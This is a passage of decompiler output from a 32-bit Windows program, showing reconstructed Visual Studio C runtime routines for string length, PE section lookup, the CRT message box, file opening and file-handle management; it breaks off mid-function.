// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2010 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2010 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  uint uVar1;
  BOOL BVar2;
  PIMAGE_SECTION_HEADER p_Var3;
  int **unaff_FS_OFFSET;
  int *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = *unaff_FS_OFFSET;
  local_c = DAT_00420044 ^ 0x41ebd8;
  *unaff_FS_OFFSET = (int *)&local_14;
  local_8 = 0;
  BVar2 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar2 != 0) {
    p_Var3 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var3 != (PIMAGE_SECTION_HEADER)0x0) {
      uVar1 = p_Var3->Characteristics;
      *unaff_FS_OFFSET = local_14;
      return ~(uVar1 >> 0x1f) & 1;
    }
  }
  *unaff_FS_OFFSET = local_14;
  return 0;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00412e23;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00412e23:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// Library Function - Single Match
//  ___crtMessageBoxW
// 
// Library: Visual Studio 2010 Release

int __cdecl ___crtMessageBoxW(LPCWSTR _LpText,LPCWSTR _LpCaption,UINT _UType)

{
  HMODULE hModule;
  FARPROC pFVar1;
  code *pcVar2;
  code *pcVar3;
  int iVar4;
  undefined local_28 [4];
  LPCWSTR local_24;
  LPCWSTR local_20;
  PVOID local_1c;
  int local_18;
  undefined local_14 [8];
  byte local_c;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_24 = _LpText;
  local_20 = _LpCaption;
  local_1c = (PVOID)FUN_0040c6ff();
  local_18 = 0;
  if (DAT_004225cc == (PVOID)0x0) {
    hModule = LoadLibraryW(u_USER32_DLL_0041b314);
    if ((hModule == (HMODULE)0x0) ||
       (pFVar1 = GetProcAddress(hModule,s_MessageBoxW_0041b308), pFVar1 == (FARPROC)0x0))
    goto LAB_00412fa8;
    DAT_004225cc = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,s_GetActiveWindow_0041b2f8);
    DAT_004225d0 = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,s_GetLastActivePopup_0041b2e4);
    DAT_004225d4 = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,s_GetUserObjectInformationW_0041b2c8);
    DAT_004225dc = EncodePointer(pFVar1);
    if (DAT_004225dc != (PVOID)0x0) {
      pFVar1 = GetProcAddress(hModule,s_GetProcessWindowStation_0041b2b0);
      DAT_004225d8 = EncodePointer(pFVar1);
    }
  }
  if ((DAT_004225d8 == local_1c) || (DAT_004225dc == local_1c)) {
LAB_00412f57:
    if ((((DAT_004225d0 != local_1c) &&
         (pcVar2 = (code *)DecodePointer(DAT_004225d0), pcVar2 != (code *)0x0)) &&
        (local_18 = (*pcVar2)(), local_18 != 0)) &&
       ((DAT_004225d4 != local_1c &&
        (pcVar2 = (code *)DecodePointer(DAT_004225d4), pcVar2 != (code *)0x0)))) {
      local_18 = (*pcVar2)(local_18);
    }
  }
  else {
    pcVar2 = (code *)DecodePointer(DAT_004225d8);
    pcVar3 = (code *)DecodePointer(DAT_004225dc);
    if (((pcVar2 == (code *)0x0) || (pcVar3 == (code *)0x0)) ||
       (((iVar4 = (*pcVar2)(), iVar4 != 0 &&
         (iVar4 = (*pcVar3)(iVar4,1,local_14,0xc,local_28), iVar4 != 0)) && ((local_c & 1) != 0))))
    goto LAB_00412f57;
    _UType = _UType | 0x200000;
  }
  pcVar2 = (code *)DecodePointer(DAT_004225cc);
  if (pcVar2 != (code *)0x0) {
    (*pcVar2)(local_18,local_24,local_20,_UType);
  }
LAB_00412fa8:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  _wcslen
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2015 Release,
// Visual Studio 2019 Release

size_t __cdecl _wcslen(wchar_t *_Str)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  return ((int)pwVar2 - (int)_Str >> 1) - 1;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2010 Release

int __cdecl __set_error_mode(int _Mode)

{
  int iVar1;
  int *piVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar1 = DAT_00421878;
      DAT_00421878 = _Mode;
      return iVar1;
    }
    if (_Mode == 3) {
      return DAT_00421878;
    }
  }
  piVar2 = __errno();
  *piVar2 = 0x16;
  FUN_0040c664();
  return -1;
}



int __cdecl FUN_004130ad(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  int iVar15;
  _SECURITY_ATTRIBUTES local_38;
  undefined4 local_2c;
  uint local_28;
  HANDLE local_24;
  uint local_20;
  DWORD local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_28 = 0;
  local_6 = 0;
  local_c = 0;
  local_38.nLength = 0xc;
  local_38.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_38.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_28);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_28 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_10 = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_10 = 0x40000000;
        goto LAB_0041316f;
      }
    }
    else if (uVar4 != 2) goto LAB_0041312f;
    local_10 = 0xc0000000;
  }
LAB_0041316f:
  if (param_4 == 0x10) {
    local_18 = 0;
  }
  else if (param_4 == 0x20) {
    local_18 = 1;
  }
  else if (param_4 == 0x30) {
    local_18 = 2;
  }
  else if (param_4 == 0x40) {
    local_18 = 3;
  }
  else {
    if (param_4 != 0x80) {
LAB_0041312f:
      puVar5 = ___doserrno();
      *puVar5 = 0;
      *in_EAX = 0xffffffff;
      piVar6 = __errno();
      *piVar6 = 0x16;
      FUN_0040c664();
      return 0x16;
    }
    local_18 = (uint)(local_10 == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_1c = 3;
    }
    else if (uVar4 == 0x100) {
      local_1c = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_00413231;
      if (uVar4 != 0x300) goto LAB_00413211;
      local_1c = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_00413231:
        local_1c = 5;
        goto LAB_00413241;
      }
      if (uVar4 != 0x700) {
LAB_00413211:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        FUN_0040c664();
        return 0x16;
      }
    }
    local_1c = 1;
  }
LAB_00413241:
  local_14 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_00421bb8 & param_5))) {
    local_14 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_14 = local_14 | 0x4000000;
    local_10 = local_10 | 0x10000;
    local_18 = local_18 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_14 = local_14 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_14 = local_14 | 0x10000000;
    }
  }
  else {
    local_14 = local_14 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    piVar6 = __errno();
    return *piVar6;
  }
  *param_1 = 1;
  local_24 = CreateFileW(param_2,local_10,local_18,&local_38,local_1c,local_14,(HANDLE)0x0);
  if (local_24 == (HANDLE)0xffffffff) {
    if (((local_10 & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_10 = local_10 & 0x7fffffff;
      local_24 = CreateFileW(param_2,local_10,local_18,&local_38,local_1c,local_14,(HANDLE)0x0);
      if (local_24 != (HANDLE)0xffffffff) goto LAB_00413369;
    }
    pbVar1 = (byte *)((&DAT_00423840)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_0041335a;
  }
LAB_00413369:
  DVar7 = GetFileType(local_24);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_00423840)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_24);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_0041335a;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_24);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_00423840)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_00423840)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_004136d0;
    if ((param_3 & 2) == 0) goto LAB_0041349e;
    lVar8 = __lseek_nolock(*in_EAX,-1,2);
    if (lVar8 == -1) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_0041349e;
    }
    else {
      local_2c = 0;
      iVar12 = __read_nolock(*in_EAX,&local_2c,1);
      if ((((iVar12 != 0) || ((short)local_2c != 0x1a)) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,lVar8 >> 0x1f)), iVar12 != -1)) &&
         (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1)) goto LAB_0041349e;
    }
LAB_0041344e:
    __close_nolock(*in_EAX);
    goto LAB_0041335a;
  }
LAB_0041349e:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_28 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_28 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_0041350d;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_0041350d:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_20 = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_10 & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_1c == 0) goto LAB_004136d0;
        if (2 < local_1c) {
          if (local_1c < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_00413575;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_0041363a;
          }
LAB_0041356c:
          if (local_1c != 5) goto LAB_004136d0;
        }
LAB_00413575:
        iVar12 = 0;
        if (local_6 == 1) {
          local_20 = 0xbfbbef;
          iVar15 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_004136d0;
          local_20 = 0xfeff;
          iVar15 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_20 + iVar12),iVar15 - iVar12);
          if (iVar9 == -1) goto LAB_0041344e;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < iVar15);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_1c != 0)) {
            if (2 < local_1c) {
              if (4 < local_1c) goto LAB_0041356c;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_0041344e;
                goto LAB_004135c0;
              }
            }
            goto LAB_00413575;
          }
          goto LAB_004136d0;
        }
LAB_004135c0:
        iVar12 = __read_nolock(*in_EAX,&local_20,3);
        if (iVar12 == -1) goto LAB_0041344e;
        if (iVar12 == 2) {
LAB_00413647:
          if ((local_20 & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_20 & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_0041344e;
            local_6 = 2;
            goto LAB_004136d0;
          }
        }
        else if (iVar12 == 3) {
          if (local_20 == 0xbfbbef) {
            local_6 = 1;
            goto LAB_004136d0;
          }
          goto LAB_00413647;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_0041363a:
        if (uVar4 == 0xffffffff) goto LAB_0041344e;
      }
    }
  }
LAB_004136d0:
  pbVar1 = (byte *)((&DAT_00423840)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_00423840)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_00423840)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if ((local_10 & 0xc0000000) != 0xc0000000) {
    return local_c;
  }
  if ((param_3 & 1) == 0) {
    return local_c;
  }
  CloseHandle(local_24);
  pvVar10 = CreateFileW(param_2,local_10 & 0x7fffffff,local_18,&local_38,3,local_14,(HANDLE)0x0);
  if (pvVar10 != (HANDLE)0xffffffff) {
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_00423840)[(int)*in_EAX >> 5]) = pvVar10;
    return local_c;
  }
  DVar7 = GetLastError();
  __dosmaperr(DVar7);
  pbVar1 = (byte *)((&DAT_00423840)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0xfe;
  __free_osfhnd(*in_EAX);
LAB_0041335a:
  piVar6 = __errno();
  return *piVar6;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wsopen_helper
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__wsopen_helper(wchar_t *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0041ec18;
  uStack_c = 0x4137ee;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (wchar_t *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = FUN_004130ad(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_00413878();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_00413878(void)

{
  byte *pbVar1;
  int unaff_EBP;
  uint *unaff_ESI;
  int unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_EDI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_EDI) {
      pbVar1 = (byte *)((&DAT_00423840)[(int)*unaff_ESI >> 5] + 4 + (*unaff_ESI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = __wsopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __wcsnicmp_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __wcsnicmp_l(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  wint_t wVar1;
  wint_t wVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  uint uVar6;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  iVar3 = 0;
  if (_MaxCount != 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar4 = __errno();
      *piVar4 = 0x16;
      FUN_0040c664();
      iVar3 = 0x7fffffff;
    }
    else {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        iVar3 = (int)_Str1 - (int)_Str2;
        do {
          uVar5 = (uint)*(ushort *)(iVar3 + (int)_Str2);
          if ((0x40 < uVar5) && (uVar5 < 0x5b)) {
            uVar5 = uVar5 + 0x20 & 0xffff;
          }
          uVar6 = (uint)(ushort)*_Str2;
          if ((0x40 < uVar6) && (uVar6 < 0x5b)) {
            uVar6 = uVar6 + 0x20 & 0xffff;
          }
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && ((short)uVar5 != 0)) && ((short)uVar5 == (short)uVar6));
      }
      else {
        do {
          wVar1 = __towlower_l(*_Str1,&local_14);
          uVar5 = (uint)wVar1;
          wVar2 = __towlower_l(*_Str2,&local_14);
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar6 = (uint)wVar2;
          if ((_MaxCount == 0) || (wVar1 == 0)) break;
        } while (wVar1 == wVar2);
      }
      iVar3 = uVar5 - uVar6;
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  ushort uVar4;
  
  if (DAT_00422244 == 0) {
    iVar1 = 0;
    if (_MaxCount != 0) {
      if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
        piVar2 = __errno();
        *piVar2 = 0x16;
        FUN_0040c664();
        iVar1 = 0x7fffffff;
      }
      else {
        iVar1 = (int)_Str1 - (int)_Str2;
        do {
          uVar4 = *(ushort *)(iVar1 + (int)_Str2);
          if ((0x40 < uVar4) && (uVar4 < 0x5b)) {
            uVar4 = uVar4 + 0x20;
          }
          uVar3 = (uint)(ushort)*_Str2;
          if ((0x40 < uVar3) && (uVar3 < 0x5b)) {
            uVar3 = uVar3 + 0x20 & 0xffff;
          }
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (uVar4 != 0)) && (uVar4 == (ushort)uVar3));
        iVar1 = uVar4 - uVar3;
      }
    }
  }
  else {
    iVar1 = __wcsnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar1;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x413a68,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_00413a70;
  local_20 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_00413b84();
    }
  }
  *unaff_FS_OFFSET = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00420e88 = param_1;
  DAT_00420e84 = in_EAX;
  DAT_00420e8c = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00420e88 = param_1;
  DAT_00420e84 = in_EAX;
  DAT_00420e8c = unaff_EBP;
  return;
}



void FUN_00413b84(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00423834)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_00423840)[param_1 >> 5]) == -1) {
      if (DAT_00420040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_00413be4;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_00413be4:
      *(intptr_t *)(iVar3 + (&DAT_00423840)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __free_osfhnd(int param_1)

{
  int iVar1;
  int *piVar2;
  ulong *puVar3;
  int iVar4;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00423834)) {
    iVar1 = (&DAT_00423840)[param_1 >> 5];
    iVar4 = (param_1 & 0x1fU) * 0x40;
    if (((*(byte *)(iVar1 + 4 + iVar4) & 1) != 0) && (*(int *)(iVar1 + iVar4) != -1)) {
      if (DAT_00420040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_00413c6a;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_00413c6a:
      *(undefined4 *)(iVar4 + (&DAT_00423840)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar2 = __errno();
  *piVar2 = 9;
  puVar3 = ___doserrno();
  *puVar3 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2010 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00423834)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar3 + 4 + (&DAT_00423840)[_FileHandle >> 5]) & 1) != 0) {
        return *(intptr_t *)(iVar3 + (&DAT_00423840)[_FileHandle >> 5]);
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_0040c664();
  }
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2010 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_00423840)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_00413d8d();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_00423840)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_00413d8d(void)

{
  FUN_004127a9(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2010 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
